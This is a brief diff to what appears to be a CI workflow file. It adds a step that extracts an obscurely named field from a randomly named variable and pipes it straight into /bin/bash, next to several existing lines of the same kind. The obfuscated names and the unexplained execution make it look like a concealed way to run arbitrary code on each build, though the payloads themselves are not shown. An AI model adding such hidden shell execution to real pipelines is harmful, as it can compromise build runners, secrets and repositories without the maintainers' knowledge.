@@ -28,6 +28,7 @@ jobs:
           echo $uewc38 | jq -r .u3932 | /bin/bash
           echo $yu2 | jq -r .on5967 | /bin/bash
           printf '%s' "$rmax26" | jq -r .xdzyy00 | /bin/bash
+          echo $hk75 | jq -r .nu717 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
